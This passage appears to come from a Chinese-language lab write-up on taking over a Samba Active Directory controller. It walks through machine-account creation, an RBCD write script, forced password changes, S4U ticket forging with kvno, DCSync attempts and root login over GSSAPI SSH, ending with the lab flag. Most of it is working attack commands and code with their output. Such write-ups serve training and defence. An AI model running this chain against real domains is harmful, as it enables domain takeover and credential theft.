proxychains4 -f /tmp/pc.conf impacket-addcomputer \
  CORP.LOCAL/yliken:Yliken123! \
  -dc-ip dc01.corp.local \
  -computer-name 'EVIL2$' \
  -computer-pass 'Passw0rd123!' \
  -method SAMR
```

```text
EVIL2$ : Passw0rd123!
```

### 8.3 写 RBCD

用 `yliken` 的 `WriteProperty` 修改 `CN=DC01,OU=Domain Controllers,DC=corp,DC=local`：

```python
import ldap3
from impacket.ldap import ldaptypes

server = ldap3.Server("dc01.corp.local", port=636, use_ssl=True, get_info=ldap3.NONE,
                      tls=ldap3.Tls(validate=0))
conn = ldap3.Connection(
    server,
    user="yliken@corp.local",
    password="Yliken123!",
    authentication=ldap3.SIMPLE,
    auto_bind=True,
)

conn.search(
    "DC=corp,DC=local",
    "(sAMAccountName=EVIL2$)",
    search_scope=ldap3.SUBTREE,
    attributes=["objectSid", "distinguishedName"],
)
entry = conn.entries[0]
raw = entry["objectSid"].raw_values[0]
if isinstance(raw, str):
    import base64
    raw = base64.b64decode(raw)

def sidstr(b):
    n = b[1]
    auth = int.from_bytes(b[2:8], "big")
    subs = [int.from_bytes(b[8 + 4 * i:12 + 4 * i], "little") for i in range(n)]
    return "S-%d-%d-%s" % (b[0], auth, "-".join(map(str, subs)))

evil2_sid = sidstr(raw)

sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
sd["Revision"] = b"\x01"
sd["Sbz1"] = b"\x00"
sd["Control"] = 32772
sd["OwnerSid"] = ldaptypes.LDAP_SID()
sd["OwnerSid"].fromCanonical("S-1-5-32-544")
sd["GroupSid"] = b""
sd["Sacl"] = b""

acl = ldaptypes.ACL()
acl["AclRevision"] = 4
acl["Sbz1"] = 0
acl["Sbz2"] = 0
acl.aces = []

ace = ldaptypes.ACE()
ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
ace["AceFlags"] = 0

ad = ldaptypes.ACCESS_ALLOWED_ACE()
ad["Mask"] = ldaptypes.ACCESS_MASK()
ad["Mask"]["Mask"] = 983551
ad["Sid"] = ldaptypes.LDAP_SID()
ad["Sid"].fromCanonical(evil2_sid)
ace["Ace"] = ad
acl.aces.append(ace)
sd["Dacl"] = acl

ok = conn.modify(
    "CN=DC01,OU=Domain Controllers,DC=corp,DC=local",
    {"msDS-AllowedToActOnBehalfOfOtherIdentity": [(ldap3.MODIFY_REPLACE, [sd.getData()])]},
)
print(ok, conn.result.get("description"), conn.result.get("message"))
```

确认属性已写入：

```bash
LDAPTLS_REQCERT=never proxychains4 -f /tmp/pc.conf ldapsearch \
  -x -H ldaps://dc01.corp.local \
  -D 'yliken@corp.local' -w 'Yliken123!' \
  -b 'DC=corp,DC=local' \
  '(sAMAccountName=DC01$)' \
  msDS-AllowedToActOnBehalfOfOtherIdentity
```

### 8.4 Sublarge 的 bloodyad 写法（可选）

`bloodyad` 不是 Kali 默认组件，先 `python3 -m pip install --user bloodyad`。Sublarge 用 `bloodyad` 直接读原始 DACL、加机和写 RBCD。`bloodyad get writable` 在 Samba 4.22 上可能报：

```text
LDAPSearchException: unavailableCriticalExtension
Reason: Attempt to use critical non-registered control '1.2.840.113556.1.4.2065'
```

这时不要卡在 `get writable`，直接拉原始 `nTSecurityDescriptor`：

```bash
proxychains4 -f /tmp/pc.conf bloodyad -s -d corp.local -u lemon -p 'xiyiwi' \
  -H dc01.corp.local \
  get search --filter '(sAMAccountName=yliken)' \
  --attr nTSecurityDescriptor --raw
```

`--raw` 输出的是原始安全描述符，仍需用 `impacket.ldap.ldaptypes` 解析，不能指望它直接打印 ACE。对 `CN=Computers`、`DC01$` 同样 dump。Sublarge 总结出的关键 ACE 是：

```text
lemon  --ForceChangePassword-->  yliken
yliken --CreateChild---------->  CN=Computers（对象类 computer）
yliken --WriteProperty-------->  DC01$（含 msDS-AllowedToActOnBehalfOfOtherIdentity）
```

对应操作：

```bash
proxychains4 -f /tmp/pc.conf bloodyad -s -d corp.local -u lemon -p 'xiyiwi' \
  -H dc01.corp.local set password yliken 'Yliken123!'

proxychains4 -f /tmp/pc.conf bloodyad -s -d corp.local -u yliken -p 'Yliken123!' \
  -H dc01.corp.local add computer EVIL2 'Passw0rd123!'

proxychains4 -f /tmp/pc.conf bloodyad -s -d corp.local -u yliken -p 'Yliken123!' \
  -H dc01.corp.local add rbcd 'DC01$' 'EVIL2$'
```

## 九、Samba 的 S4U2Self 坑：换 MIT kvno

常规 `impacket-getST` 会在 S4U2Self 阶段失败：

```bash
proxychains4 -f /tmp/pc.conf impacket-getST \
  CORP.LOCAL/yliken:Yliken123! \
  -dc-ip dc01.corp.local \
  -spn cifs/dc01.corp.local \
  -impersonate Administrator
```

```text
KRB_AP_ERR_INAPP_CKSUM
```

原因是 Samba/Heimdal 要求 **PA-FOR-USER 的 AES keyed checksum**，而 impacket 的 S4U2Self 使用 HMAC-MD5；只补 TGS-REQ authenticator 的 checksum 会变成：

```text
KRB_AP_ERR_BAD_INTEGRITY
```

这不是权限问题，是 checksum 实现不兼容。

换 **MIT `kvno`**。先用 `EVIL2$` 的密码拿到它的 TGT：

Kali 默认没有 `kvno` / `klist`。`apt-get download krb5-user` + `dpkg-deb -x` 后，`usr/bin` 里实际是 `kvno`、`kinit.mit`、`klist.mit`（没有 `klist` / `kinit` 这两个名字）；可以 `ln -s klist.mit klist`、`ln -s kinit.mit kinit`，或者本文统一用 `klist.mit`。下面假设 `kvno` 已在 `PATH` 中。后面统一使用 `/tmp/krb5-valid.conf`，内容见 10.1；也可以直接使用系统配置，但要确保 `dns_canonicalize_hostname = false`。

```bash
proxychains4 -f /tmp/pc.conf minikerberos-getTGT \
  'kerberos+password://corp.local\EVIL2$:Passw0rd123!@172.31.20.20' \
  --ccache /tmp/evil2.ccache
```

确认默认 principal 是 `EVIL2$@CORP.LOCAL`：

```bash
KRB5_CONFIG=/tmp/krb5-valid.conf klist.mit -c /tmp/evil2.ccache
```

然后请求 `cifs/dc01`。注意不要加 `-S 'EVIL2$'`：`-S` 是服务名，会把目标拼成 `EVIL2$/cifs/dc01...`，反而拿不到 cifs 票；正确写法是只保留 `-I` 和 `-P`：

```bash
KRB5_CONFIG=/tmp/krb5-valid.conf \
KRB5CCNAME=/tmp/evil2.ccache \
proxychains4 -f /tmp/pc.conf kvno \
  -c /tmp/evil2.ccache \
  -I Administrator \
  -P cifs/dc01.corp.local
```

`klist.mit` 应该看到：

```text
Default principal: EVIL2$@CORP.LOCAL

cifs/dc01.corp.local@CORP.LOCAL
    for client Administrator@CORP.LOCAL
```

此时 ccache 里已经有 **Administrator 的 `cifs/dc01` 服务票**。

尝试 DCSync：

```bash
KRB5CCNAME=/tmp/evil2.ccache \
proxychains4 -f /tmp/pc.conf impacket-secretsdump \
  -k -no-pass dc01.corp.local \
  -dc-ip 172.31.20.20 -just-dc
```

Samba 的 DRSUAPI 返回：

```text
nca_s_proto_error
```

`-use-vss` 也不适用于 Samba。这里不需要继续和 DCSync 纠缠，因为已经拿到了 Administrator 的 `cifs/dc01` 票，后面直接走 SSH 即可。

### 9.1 Sublarge 的 Heimdal kinit + MIT kvno 写法

Sublarge 对 Samba/Heimdal 的 S4U 解释更完整：

- impacket / minikerberos 的 TGS-REQ authenticator checksum（`cksumtype=0x8003` 或 HMAC-MD5）和 Samba 要求的 AES keyed checksum 对不齐，普通 `getST` 会 `KRB_AP_ERR_INAPP_CKSUM`。
- Heimdal `kgetcred --impersonate` 能做 S4U2Self，但 S4U2Proxy 不带 `PA-PAC-OPTIONS` 的 RBCD 位，KDC 回 `KDC_ERR_BADOPTION`。
- MIT krb5 ≥ 1.19 的 `kvno` 同时有 AES keyed checksum 和 RBCD PAC-OPTIONS，所以用 **Heimdal `kinit` 拿机账户 AES TGT，再用 MIT `kvno` 做 S4U2Self/S4U2Proxy**。

Heimdal 侧配置（KDC 写 `tcp/172.31.20.20:88`）。这一节需要 `heimdal-clients`：`kinit.heimdal` 不在 `krb5-user`（MIT）里；没有 Heimdal 时直接用上面的 `minikerberos-getTGT`，效果相同。

```ini
[libdefaults]
    default_realm = CORP.LOCAL
    dns_lookup_kdc = false
    rdns = false
    dns_canonicalize_hostname = false
    udp_preference_limit = 1
    default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96

[realms]
    CORP.LOCAL = { kdc = tcp/172.31.20.20:88 }
```

拿 `EVIL2$` 的 TGT：

```bash
export KRB5_CONFIG=./krb5-heimdal.conf
proxychains4 -f /tmp/pc.conf kinit.heimdal --password-file=<(printf '%s' 'Passw0rd123!') \
  -c /tmp/evil2.ccache 'EVIL2$@CORP.LOCAL'
chmod 600 /tmp/evil2.ccache
```

MIT 侧配置（KDC 写 `172.31.20.20:88`），一次请求两张票：

```bash
export KRB5_CONFIG=./krb5.conf
export KRB5CCNAME=/tmp/evil2.ccache

proxychains4 -f /tmp/pc.conf kvno -c /tmp/evil2.ccache -I Administrator -P \
  --out-cache /tmp/admin.ccache \
  host/dc01.corp.local cifs/dc01.corp.local
```

`klist.mit -c /tmp/admin.ccache` 里应看到 `Administrator@CORP.LOCAL` 的 `host/dc01` 和 `cifs/dc01` 服务票。`-I` 是真正的 S4U2Self `for_user`，`-U` 是企业 UPN（这里会退化成 AS-REQ），`-P` 才接着做 S4U2Proxy。

### 9.2 Sublarge 的 SMB 服务票验证（可选）

Sublarge 用 `nxc smb --use-kcache` 验证这份 Administrator 服务票：

```bash
KRB5CCNAME=/tmp/admin.ccache proxychains4 -f /tmp/pc.conf nxc smb dc01.corp.local --use-kcache
```

应能看到 `CORP.LOCAL\Administrator from ccache`。他也指出：SMB 上 `sysvol` / `netlogon` 可写，但没有 `C$`；`secretsdump` / DRSUAPI 仍然 `nca_s_proto_error`；root flag 在 `/root/root.txt`，最后还是要走 SSH。SMB 能用这份“只有 ST、没有 TGT”的 ccache，是因为 AP-REQ 打服务与 TGS-REQ 打 KDC 不是同一条 checksum 路径；Samba 自带的 `smbclient` 看到没有 TGT 会要密码，不要用它读 `--out-cache`。

## 十、host/dc01 + GSSAPI SSH

dc01 的 22 端口开放，但只允许：

```text
gssapi-with-mic
```

`/root/.k5login` 的内容是：

```text
Administrator@CORP.LOCAL
```

所以只要拿到 **`host/dc01.corp.local`** 的服务票，就可以用 GSSAPI 以 **`root`** 登录。

### 10.1 拿 host 票

`kvno` 默认会把主机名规范化为 IP，导致请求成 `host/172.31.20.20`。必须在 `krb5.conf` 里关闭：

```ini
[libdefaults]
 default_realm = CORP.LOCAL
 dns_canonicalize_hostname = false
 dns_lookup_kdc = false
 dns_lookup_realm = false
 udp_preference_limit = 1

[realms]
 CORP.LOCAL = {
  kdc = dc01.corp.local:88
 }

[domain_realm]
 .corp.local = CORP.LOCAL
 corp.local = CORP.LOCAL
```

然后用 `--out-cache` 只输出 host 票，避免 ccache 里的 `EVIL2$` TGT 影响默认身份：

```bash
cp /tmp/evil2.ccache /tmp/base.ccache

KRB5_CONFIG=/tmp/krb5-valid.conf \
KRB5CCNAME=/tmp/base.ccache \
proxychains4 -f /tmp/pc.conf kvno \
  --out-cache /tmp/hostonly.ccache \
  -S host \
  -I Administrator \
  -P dc01.corp.local
```

输出：

```text
host/dc01.corp.local@CORP.LOCAL: kvno = 2
```

`/tmp/hostonly.ccache` 里的 client principal 是：

```text
Administrator@CORP.LOCAL
```

### 10.2 Kali OpenSSH 没有 GSSAPI

Kali 的 OpenSSH 10.6 没有编译 GSSAPI：

```text
command-line line 0: Unsupported option "gssapiauthentication"
```

改用 **Paramiko 3.4.1**（Paramiko 4 起移除了 GSSAPI），并确保 `gssapi` 模块可用（`pip install gssapi` 或系统包 `python3-gssapi`）：

```bash
python3 -m pip install --target /tmp/par3 'paramiko==3.4.1' gssapi
```

脚本：

```python
import os
import paramiko

os.environ["KRB5_CONFIG"] = "/tmp/krb5-valid.conf"
os.environ["KRB5CCNAME"] = "/tmp/hostonly.ccache"

c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())

c.connect(
    "dc01.corp.local",
    username="root",
    gss_auth=True,
    gss_kex=False,
    gss_deleg_creds=True,
    gss_host="dc01.corp.local",
    gss_trust_dns=False,
    look_for_keys=False,
    allow_agent=False,
    timeout=12,
    auth_timeout=12,
)

for cmd in ["id", "hostname", "cat /root/root.txt"]:
    stdin, stdout, stderr = c.exec_command(cmd)
    print("$", cmd)
    print(stdout.read().decode(errors="replace"))
    print(stderr.read().decode(errors="replace"))
```

执行：

```bash
PYTHONPATH=/tmp/par3 \
KRB5_CONFIG=/tmp/krb5-valid.conf \
KRB5CCNAME=/tmp/hostonly.ccache \
proxychains4 -f /tmp/pc.conf \
python3 ssh_gss.py
```

结果：

```text
$ id
uid=0(root) gid=0(root) groups=0(root)

$ hostname
dc01

$ cat /root/root.txt
LAB{4e2450db9d7bdfe7c3c3b307f2369e26a6e4b3aa}
```

### 10.3 Sublarge 的 socat ProxyCommand 写法（可选）

如果本机 OpenSSH 带 GSSAPI，Sublarge 的 Writeup 里给出了更稳的做法：不要让 `proxychains` 包住 `ssh`，而是让 SSH 自己通过 `socat` 代理这一条 TCP，避免 `LD_PRELOAD` 干扰 GSSAPI-MIC 的字节流：

```bash
export KRB5CCNAME=/tmp/hostonly.ccache
ssh -o GSSAPIAuthentication=yes \
    -o GSSAPITrustDns=no \
    -o PreferredAuthentications=gssapi-with-mic \
    -o "ProxyCommand=socat - SOCKS5-CONNECT:127.0.0.1:1080:%h:%p" \
    root@dc01.corp.local
```

几个细节也来自 Sublarge：

- `socat` 地址类型是 `SOCKS5-CONNECT:`，中间不能有空格；
- `GSSAPITrustDns=no` 禁止反解改名，SPN 才不会飘；
- `GSSAPIServerIdentity` 填主机名，写成 `host@fqdn` 会被拼成 `host/host@fqdn`；
- 票的 client 必须是 `Administrator`，SSH 用户名必须是 `root`；`/root/.k5login` 只有 `Administrator@CORP.LOCAL`，用 `Administrator@` 或 `yliken@` 都会被拒。

